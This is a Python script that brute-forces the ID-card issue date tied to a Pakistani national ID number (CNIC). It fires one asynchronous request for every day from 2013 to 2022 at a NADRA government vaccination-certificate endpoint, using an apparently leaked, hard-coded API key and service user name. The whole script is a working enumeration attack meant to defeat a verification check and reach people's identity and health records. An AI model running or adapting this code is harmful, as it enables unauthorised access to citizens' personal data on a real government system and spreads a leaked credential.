import asyncio
from datetime import date, timedelta

import aiohttp


def ISSUE_DATE_GENERATOR(YEAR):
    d1 = date(YEAR, 1, 1)  # start date
    d2 = date(YEAR, 12, 31)  # end date
    delta = d2 - d1  # timedelta
    combos = []
    for i in range(delta.days + 1):
        formatted = (d1 + timedelta(i)).strftime("%d-%m-%Y")
        combos.append(formatted)
    return combos


class ISSUE_DATE_FINDER:
    def __init__(self):
        self.ISSUE_DATE_FOUND = ""

    async def get_pokemon(self, session, url, payload):
        async with session.post(url=url, data=payload) as resp:
            pokemon = await resp.json()
            if pokemon['code'] == '204':
                pass
            else:
                self.ISSUE_DATE_FOUND = payload
                session.close()
            return pokemon

    async def RUNNER(self, cnic, issuedate):
        headers = {
            'Content-Type': 'application/json'
        }

        async with aiohttp.ClientSession(headers=headers) as session:
            url = "https://nimscert.nadra.gov.pk/nims-certification-service/v1/certificate/fully-vaccinated"

            tasks = []
            for single in issuedate:
                payload = '''{
                            "apiKey": "Ni5U53r((!!!",
                            "citizenType": "",
                            "cnic": "''' + str(cnic) + '''",
                            "issueDate": "''' + str(single) + '''",
                            "userName": "nisUser",
                            "userType": "nis" 
                        }'''
                tasks.append(asyncio.ensure_future(self.get_pokemon(session, url, payload)))

            original_pokemon = await asyncio.gather(*tasks)

    def EXECUTOR(self, cnic):
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        ISSUES_DATES_ALL = [ISSUE_DATE_GENERATOR(2013), ISSUE_DATE_GENERATOR(2014), ISSUE_DATE_GENERATOR(2015),
                            ISSUE_DATE_GENERATOR(2016), ISSUE_DATE_GENERATOR(2017), ISSUE_DATE_GENERATOR(2018),
                            ISSUE_DATE_GENERATOR(2019), ISSUE_DATE_GENERATOR(2020), ISSUE_DATE_GENERATOR(2021),
                            ISSUE_DATE_GENERATOR(2022)][::-1]

        for year in ISSUES_DATES_ALL:
            asyncio.run(self.RUNNER(cnic, year))
            if self.ISSUE_DATE_FOUND == "":
                pass
            else:
                self.ISSUE_DATE_FOUND = eval(self.ISSUE_DATE_FOUND)
                break

        return self.ISSUE_DATE_FOUND


# t = ISSUE_DATE_FINDER()
# print(t.EXECUTOR("3520155911111"))
